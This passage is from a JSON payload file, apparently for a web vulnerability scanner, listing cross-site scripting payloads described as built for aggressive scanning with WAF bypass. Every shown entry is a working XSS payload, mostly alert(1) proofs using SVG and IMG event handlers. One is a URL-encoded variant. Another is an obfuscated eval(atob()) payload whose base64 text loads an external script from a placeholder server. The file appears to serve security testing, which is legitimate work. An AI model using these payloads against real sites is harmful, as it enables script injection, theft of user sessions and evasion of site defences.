  "description": "Advanced XSS payloads for aggressive scanning with WAF bypass techniques",
  "patterns": [
    {
      "id": "xss-svg-onload-basic",
      "type": "svg-event",
      "name": "SVG onload (classic)",
      "pattern": "<svg/onload=alert(1)>",
      "context": "body-context"
    },
    {
      "id": "xss-img-onerror-basic",
      "type": "img-event",
      "name": "IMG onerror (classic)",
      "pattern": "<img src=x onerror=alert(1)>",
      "context": "body-context"
    },
    {
      "id": "xss-svg-onload-base64-external",
      "type": "svg-event",
      "name": "SVG onload with base64 external script (WAF bypass)",
      "pattern": "<svg/onload=\"eval(atob(this.id))\" id=\"Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==\">",
      "context": "body-context"
    },
    {
      "id": "xss-svg-onload-double-encoded",
      "type": "svg-event",
      "name": "SVG onload double URL encoded (WAF bypass)",
      "pattern": "%26%230x3C%3Bsvg%20onload%3Dalert(1)%26%230x3E%3B",
      "context": "body-context"
    },
    {
      "id": "xss-svg-animate-onbegin",
      "type": "svg-event",
      "name": "SVG animate onbegin (rare event)",
      "pattern": "<svg><animate onbegin=alert(1) dur=\"1s\"></animate></svg>",
      "context": "body-context"
    },
    {
      "id": "xss-svg-foreignobject-iframe",
